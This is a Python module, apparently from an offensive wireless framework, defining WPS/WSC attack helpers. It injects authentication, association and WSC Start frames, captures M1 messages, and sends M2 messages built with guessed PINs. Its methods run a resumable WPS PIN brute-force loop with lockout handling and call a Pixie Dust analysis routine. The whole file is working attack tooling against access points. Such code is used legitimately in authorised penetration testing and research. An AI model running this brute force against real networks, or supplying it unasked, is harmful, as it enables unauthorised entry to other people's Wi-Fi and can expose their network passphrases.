#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""WPS / WSC attack helpers — inherit ``Wlan_wsc``."""

from __future__ import annotations

import time
from typing import Callable

from core.framework.base_module import BaseModule

from lib.protocols.wlan.mac import str_to_mac
from lib.protocols.wlan.mgmt import build_association_request, build_open_auth_request
from lib.protocols.wlan.wps_pin import WpsPinBruteState, iter_wps_pins, parse_pin_index
from lib.protocols.wlan.wsc import (
    MSG_M1,
    MSG_M7,
    _ATTR_PSK,
    analyze_wsc_pixie,
    build_eap_wsc_start,
    build_wsc_data_frame,
    parse_eap_wsc,
)
from lib.protocols.wlan.wsc_crypto import build_enrollee_m2_eap, new_enrollee_nonce


class Wlan_wsc(BaseModule):
    def wlan_parse_wsc_eapol(self, raw: bytes) -> object | None:
        frame = self.wlan_strip_radiotap(raw)
        return parse_eap_wsc(frame)

    def wlan_build_wsc_start_frame(self, bssid: str, sta: str) -> bytes:
        return build_wsc_data_frame(bssid, sta, build_eap_wsc_start(), to_ds=True)

    def wlan_wsc_associate_and_start(
        self,
        bssid: str,
        ssid: str,
        sta: str,
        *,
        dwell: float = 20.0,
    ) -> list[object]:
        """Open auth, assoc, WSC Start, collect M1/M2."""
        captured: list[object] = []
        auth = build_open_auth_request(bssid, sta)
        assoc = build_association_request(bssid, sta, ssid)
        wsc = self.wlan_build_wsc_start_frame(bssid, sta)
        self.wlan_inject_raw([auth, assoc], count=1)
        time.sleep(0.2)
        self.wlan_inject_raw([wsc], count=3)

        def on_frame(raw: bytes, _rssi: int | None) -> None:
            msg = parse_eap_wsc(self.wlan_strip_radiotap(raw))
            if msg and msg.msg_type in (4, 5, 6, 8):
                captured.append(msg)

        self.wlan_sniff(on_frame, timeout=float(dwell))
        return captured

    def wlan_wsc_exchange_m1(
        self,
        bssid: str,
        ssid: str,
        sta: str,
        *,
        dwell: float = 8.0,
    ) -> object | None:
        """Single WSC session until M1 is seen."""
        m1_holder: list[object] = []
        auth = build_open_auth_request(bssid, sta)
        assoc = build_association_request(bssid, sta, ssid)
        wsc = self.wlan_build_wsc_start_frame(bssid, sta)
        self.wlan_inject_raw([auth, assoc], count=1)
        time.sleep(0.15)
        self.wlan_inject_raw([wsc], count=2)

        def on_frame(raw: bytes, _rssi: int | None) -> None:
            msg = parse_eap_wsc(self.wlan_strip_radiotap(raw))
            if msg and msg.msg_type == MSG_M1 and not m1_holder:
                m1_holder.append(msg)

        self.wlan_sniff(on_frame, timeout=float(dwell))
        return m1_holder[0] if m1_holder else None

    def wlan_wsc_try_pin(
        self,
        bssid: str,
        ssid: str,
        sta: str,
        pin: str,
        *,
        dwell: float = 4.0,
    ) -> str:
        """
        Run WSC with one PIN (M2). Returns ``found``, ``reject``, ``locked``, ``timeout``.
        """
        m1 = self.wlan_wsc_exchange_m1(bssid, ssid, sta, dwell=min(dwell, 8.0))
        if m1 is None:
            return "locked"
        e_nonce = new_enrollee_nonce()
        try:
            eap = build_enrollee_m2_eap(
                m1,
                pin,
                e_nonce,
                sta_mac=str_to_mac(sta),
                ap_mac=str_to_mac(bssid),
            )
        except (ValueError, TypeError):
            return "reject"
        frame = build_wsc_data_frame(bssid, sta, eap, to_ds=True)
        outcome = {"result": "timeout"}

        def on_frame(raw: bytes, _rssi: int | None) -> None:
            msg = parse_eap_wsc(self.wlan_strip_radiotap(raw))
            if not msg:
                return
            if msg.msg_type == MSG_M7 and _ATTR_PSK in msg.attributes:
                outcome["result"] = "found"
            elif msg.msg_type == MSG_M7:
                outcome["result"] = "found"

        self.wlan_inject_raw([frame], count=3)
        self.wlan_sniff(on_frame, timeout=float(dwell))
        return outcome["result"]

    def wlan_wsc_brute_pin(
        self,
        bssid: str,
        ssid: str,
        sta: str,
        *,
        start_pin: str = "00000000",
        max_attempts: int = 0,
        delay: float = 2.0,
        dwell: float = 4.0,
        resume_path: str = "",
        on_attempt: Callable[[str, int, str], None] | None = None,
    ) -> WpsPinBruteState:
        state = WpsPinBruteState(bssid=bssid, ssid=ssid, last_pin=start_pin)
        if resume_path:
            loaded = WpsPinBruteState.load(resume_path)
            if loaded and loaded.bssid.lower() == bssid.lower():
                state = loaded
                if state.found_pin:
                    return state

        start_idx = parse_pin_index(state.last_pin) + 1
        tried = 0
        for pin in iter_wps_pins(start=start_idx):
            if max_attempts and tried >= max_attempts:
                break
            tried += 1
            state.attempts += 1
            state.last_pin = pin
            result = self.wlan_wsc_try_pin(bssid, ssid, sta, pin, dwell=float(dwell))
            if on_attempt:
                on_attempt(pin, state.attempts, result)
            if result == "found":
                state.found_pin = pin
                if resume_path:
                    state.save(resume_path)
                return state
            if result == "locked":
                if resume_path:
                    state.save(resume_path)
                return state
            if resume_path and (state.attempts % 10 == 0):
                state.save(resume_path)
            time.sleep(max(0.5, float(delay)))

        if resume_path:
            state.save(resume_path)
        return state

    def wlan_analyze_pixie(self, m1: object, bssid: str, sta: str) -> dict:
        return analyze_wsc_pixie(m1, bssid, sta)